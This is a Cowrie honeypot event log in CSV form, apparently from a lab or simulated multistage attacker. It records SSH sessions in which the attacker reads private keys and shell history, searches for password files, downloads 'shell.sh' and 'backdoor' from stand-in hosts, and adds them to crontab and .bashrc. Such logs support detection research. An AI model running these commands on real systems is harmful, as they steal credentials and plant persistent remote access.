timestamp,source,src_ip,attacker_role,event_type,event_category,service,detail,session_id
2026-02-06 21:05:49.379778,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:49.387533,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:49.388341,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:49.481252,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:49.482115,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,ls -la /root,23
2026-02-06 21:05:49.489999,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:05:49.491840,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:05:50.521190,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:05:50.523202,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:05:50.531970,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:05:50.554985,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:50.561616,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:50.562401,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:50.594855,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:50.595656,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,ls -la /opt,23
2026-02-06 21:05:50.602385,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:05:50.605078,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:05:51.635128,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:05:51.637141,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:05:51.640487,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:05:51.666840,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:51.673667,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:51.674835,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:51.789441,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:51.790213,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,ls -la /var/www,23
2026-02-06 21:05:51.796683,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:05:51.802056,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:05:52.827480,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:05:52.830557,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:05:52.834362,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:05:52.858704,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:52.867831,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:52.870027,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:52.906388,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:52.907287,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,cat ~/.bash_history,23
2026-02-06 21:05:52.914162,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:05:52.917449,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:05:53.948196,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:05:53.949612,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:05:53.955874,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:05:53.983148,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:53.990808,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:53.991969,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:54.093628,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:54.094432,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,cat ~/.ssh/id_rsa,23
2026-02-06 21:05:54.099613,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:05:54.101877,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:05:55.132562,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:05:55.134322,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:05:55.140328,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:05:55.166195,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:55.174168,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:55.175295,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:55.270783,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:55.271636,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,cat /etc/ssh/sshd_config,23
2026-02-06 21:05:55.278773,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:05:55.280996,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:05:56.307366,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:05:56.308389,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:05:56.312176,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:05:56.335957,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:05:56.343164,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:56.344268,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:05:56.385594,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:05:56.386562,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,find / -name '*.conf' 2>/dev/null | head -20,23
2026-02-06 21:06:13.693405,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:13.696628,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:14.728498,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:14.729650,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:14.735552,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:14.759673,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:14.766277,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:14.767041,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:14.871701,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:14.872656,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,find / -name 'password*' 2>/dev/null,23
2026-02-06 21:06:32.130799,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:32.133376,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:33.146885,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:33.147549,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:33.151139,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:33.163413,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:33.169701,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:33.170416,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:33.197960,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:33.198765,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,ifconfig,23
2026-02-06 21:06:33.203399,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:33.206103,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:34.221383,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:34.222351,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:34.226117,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:34.241309,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:34.246449,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:34.247325,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:34.357234,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:34.358009,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,netstat -an,23
2026-02-06 21:06:34.362726,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:34.365448,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:35.376654,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:35.377693,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:35.381594,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:35.397042,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:35.408344,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:35.408871,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:35.503869,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:35.504714,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,arp -a,23
2026-02-06 21:06:35.505841,cowrie,172.16.0.105,multistage,cowrie.command.failed,command,SSH/Telnet,arp -a,23
2026-02-06 21:06:35.512897,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:35.515324,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:36.521290,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:36.522353,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:36.526314,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:36.539640,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:36.544376,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:36.545136,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:36.575937,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:36.576778,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,wget http://malware.com/shell.sh -O /tmp/shell.sh,23
2026-02-06 21:06:36.631156,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:37.638505,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:37.641111,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:37.645845,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:37.662757,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:37.668772,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:37.669733,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:37.769602,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:37.770527,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,curl -o /tmp/backdoor http://evil.com/backdoor,23
2026-02-06 21:06:37.824269,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:38.833770,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:38.834773,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:38.838595,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:38.851157,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:38.856019,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:38.856255,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:38.936442,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:38.937378,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,chmod +x /tmp/*,23
2026-02-06 21:06:38.942185,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:38.945355,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:39.959465,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:39.960669,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:39.964302,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:39.979268,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:39.984490,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:39.985139,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:40.016633,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:40.017461,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,echo '* * * * * /tmp/shell.sh' >> /etc/crontab,23
2026-02-06 21:06:40.022449,cowrie,172.16.0.105,multistage,cowrie.session.file_download,session,SSH/Telnet,,23
2026-02-06 21:06:40.023265,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:40.025950,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:41.044664,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:41.046675,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:41.050112,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:41.065020,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:41.070381,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:41.071142,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:41.173918,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:41.174713,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,echo '/tmp/backdoor &' >> ~/.bashrc,23
2026-02-06 21:06:41.180004,cowrie,172.16.0.105,multistage,cowrie.session.file_download,session,SSH/Telnet,,23
2026-02-06 21:06:41.180955,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:41.183084,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:42.196273,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:42.197860,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:42.203017,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:42.218786,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:42.225066,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:42.225547,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:42.255305,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:42.256626,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,whoami,23
2026-02-06 21:06:42.261692,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:42.263042,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:43.279090,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:43.280334,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:43.284460,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:43.296209,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:43.301806,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:43.303477,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:43.400808,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:43.402197,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,id,23
2026-02-06 21:06:43.407180,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:43.409348,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
2026-02-06 21:06:44.418372,cowrie,172.16.0.105,multistage,cowrie.session.connect,session,SSH/Telnet,,23
2026-02-06 21:06:44.419730,cowrie,172.16.0.105,multistage,cowrie.client.version,client_info,SSH/Telnet,,23
2026-02-06 21:06:44.422110,cowrie,172.16.0.105,multistage,cowrie.client.kex,client_info,SSH/Telnet,,23
2026-02-06 21:06:44.439947,cowrie,172.16.0.105,multistage,cowrie.login.success,authentication,SSH/Telnet,,23
2026-02-06 21:06:44.446167,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:44.447263,cowrie,172.16.0.105,multistage,cowrie.client.var,client_info,SSH/Telnet,,23
2026-02-06 21:06:44.533934,cowrie,172.16.0.105,multistage,cowrie.session.params,session,SSH/Telnet,,23
2026-02-06 21:06:44.534695,cowrie,172.16.0.105,multistage,cowrie.command.input,command,SSH/Telnet,uname -a,23
2026-02-06 21:06:44.540990,cowrie,172.16.0.105,multistage,cowrie.log.closed,other,SSH/Telnet,,23
2026-02-06 21:06:44.543809,cowrie,172.16.0.105,multistage,cowrie.session.closed,session,SSH/Telnet,,23
